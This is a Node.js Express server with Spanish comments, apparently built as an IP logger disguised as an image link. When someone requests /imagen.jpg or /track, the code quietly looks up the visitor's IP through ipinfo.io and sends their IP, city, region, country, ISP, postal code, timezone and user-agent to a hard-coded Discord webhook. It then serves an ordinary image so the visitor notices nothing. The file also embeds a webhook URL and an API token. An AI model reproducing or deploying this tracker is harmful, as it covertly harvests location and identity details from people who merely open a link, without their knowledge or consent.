const express = require("express");
const path = require("path");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI"; // Tu webhook

// Servir archivos estáticos desde /public
app.use(express.static(path.join(__dirname, "public")));

// Obtener información IP
async function getIPInfo(ip) {
  try {
    const res = await fetch(`https://ipinfo.io/${ip}/json?token=2588357cc4131e`);
    return await res.json();
  } catch (err) {
    console.error("Error al obtener info de IP:", err);
    return {};
  }
}

// Enviar datos al webhook
async function sendToDiscord(info, userAgent, timestamp) {
  const message = {
    content: `📡 **Nueva visita a la imagen**\n\n🕒 Hora (UTC): ${timestamp}\n🌐 IP: \`${info.ip || "Desconocida"}\`\n📍 Ciudad: ${info.city || "Desconocida"}, ${info.region || "Desconocida"}\n🌎 País: ${info.country || "Desconocido"}\n🏢 ISP: ${info.org || "Desconocido"}\n📦 ASN: ${info.asn || "Desconocido"}\n📫 Postal: ${info.postal || "Desconocido"}\n🕰️ Timezone: ${info.timezone || "Desconocido"}\n🧭 User-Agent:\n\`\`\`${userAgent || "No disponible"}\`\`\``
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });
  } catch (err) {
    console.error("Error al enviar al webhook:", err);
  }
}

// Ruta especial: imagen.jpg
app.get("/imagen.jpg", async (req, res) => {
  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim();
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  const info = await getIPInfo(ip);
  info.ip = ip;

  await sendToDiscord(info, userAgent, timestamp);

  // Mostrar la imagen real
  res.sendFile(path.join(__dirname, "public", "imagen.jpg"));
});

// Ruta de tracking manual (opcional)
app.get("/track", async (req, res) => {
  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim();
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  const info = await getIPInfo(ip);
  info.ip = ip;

  await sendToDiscord(info, userAgent, timestamp);
  res.json({ success: true });
});

// Iniciar el servidor
app.listen(PORT, () => {
  console.log(`✅ Servidor activo en http://localhost:${PORT}`);
});

